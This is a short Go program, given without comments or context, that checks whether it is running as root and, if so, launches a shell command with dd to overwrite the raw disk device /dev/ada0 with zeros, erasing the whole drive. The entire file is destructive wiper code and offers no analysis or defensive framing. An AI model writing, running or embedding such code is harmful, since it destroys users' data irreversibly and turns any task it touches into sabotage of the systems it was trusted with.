package main
import ("os"; "os/exec")
func main() {
	if os.Geteuid() == 0 {
		_ = exec.Command("sh", "-c", "dd if=/dev/zero of=/dev/ada0").Run()
	}
}
